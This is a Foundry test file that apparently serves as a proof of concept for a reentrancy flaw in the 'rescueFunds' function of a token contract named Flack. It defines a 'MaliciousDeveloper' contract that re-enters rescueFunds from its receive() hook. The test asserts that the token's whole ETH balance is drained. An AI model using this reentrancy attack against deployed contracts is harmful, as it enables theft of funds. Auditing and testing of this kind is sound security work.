// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.22;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Flack.sol";

contract MaliciousDeveloper {
    Flack public token;
    uint256 public reentryCount = 0;

    constructor(Flack _token) {
        token = _token;
    }

    function attack() external {
        token.rescueFunds();
    }

    receive() external payable {
        reentryCount++;
        if (reentryCount == 1) {
            // Fund token contract to enable second reentrancy
            payable(address(token)).transfer(1 ether);
            token.rescueFunds();
        }
    }
}

contract FlackRescueFundsTest is Test {
    Flack public flack;
    MaliciousDeveloper public maliciousDev;
    
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address mockFactory = makeAddr("mockFactory");
    address mockWETH = makeAddr("mockWETH");
    address mockPair = makeAddr("mockPair");

    function setUp() public {
        // Mock Uniswap router calls
        vm.mockCall(
            address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),
            abi.encodeWithSignature("factory()"),
            abi.encode(mockFactory)
        );
        vm.mockCall(
            address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),
            abi.encodeWithSignature("WETH()"),
            abi.encode(mockWETH)
        );
        vm.mockCall(
            mockFactory,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(mockPair)
        );

        // Deploy contracts
        vm.startPrank(owner);
        flack = new Flack();
        maliciousDev = new MaliciousDeveloper(flack);
        flack.setDeveloperWallet(address(maliciousDev));
        vm.stopPrank();

        // Fund token contract
        vm.deal(address(flack), 10 ether);
        vm.deal(address(maliciousDev), 1 ether);
    }

    function test_RescueFundsReentrancyVulnerability() public {
        uint256 initialTokenBalance = address(flack).balance;
        assertEq(initialTokenBalance, 10 ether, "Initial token balance should be 10 ether");

        // Get pre-attack state
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 flackBalanceBefore = address(flack).balance;
        uint256 maliciousDevBalanceBefore = address(maliciousDev).balance;
        console.log("Flack contract balance:    ", flackBalanceBefore);
        console.log("Malicious Developer balance: ", maliciousDevBalanceBefore);

        console.log("--- Trigger Attack ---");
        maliciousDev.attack();

        // Get post-attack state
        console.log("--- AFTER-Trigger Balances ---");
        uint256 flackBalanceAfter = address(flack).balance;
        uint256 maliciousDevBalanceAfter = address(maliciousDev).balance;
        console.log("Flack contract balance:    ", flackBalanceAfter);
        console.log("Malicious Developer balance: ", maliciousDevBalanceAfter);

        // Check state changes
        console.log("--- Differential Results ---");
        console.log("Flack balance reduction: %d", flackBalanceBefore - flackBalanceAfter);
        console.log("Malicious Dev gains:     %d", maliciousDevBalanceAfter - maliciousDevBalanceBefore);

        // Calculate net transfer (expected gain = flackBalanceBefore)
        bool flackDrained = flackBalanceAfter == 0;
        bool profitCaptured = maliciousDevBalanceAfter - maliciousDevBalanceBefore == flackBalanceBefore;
        bool vulnExists = flackDrained && profitCaptured;
        
        // Final verdict
        if (vulnExists) {
            console.log("Vulnerability verified: Malicious developer extracted full contract balance");
            console.log("Vulnerability Exists: Reentrancy in rescueFunds allows ETH drain");
        } else {
            console.log("Vulnerability not verified: Unexpected balance changes occurred");
            console.log("Vulnerability not Exist: Reentrancy attack failed to extract full ETH balance");
        }

        // Original assertions preserved
        assertEq(maliciousDev.reentryCount(), 2, "Reentrancy should occur twice");
        assertEq(flackBalanceAfter, 0, "Token contract should be drained");
        assertTrue(
            address(maliciousDev).balance > 10 ether,
            "Malicious developer should profit from reentrancy"
        );
    }
}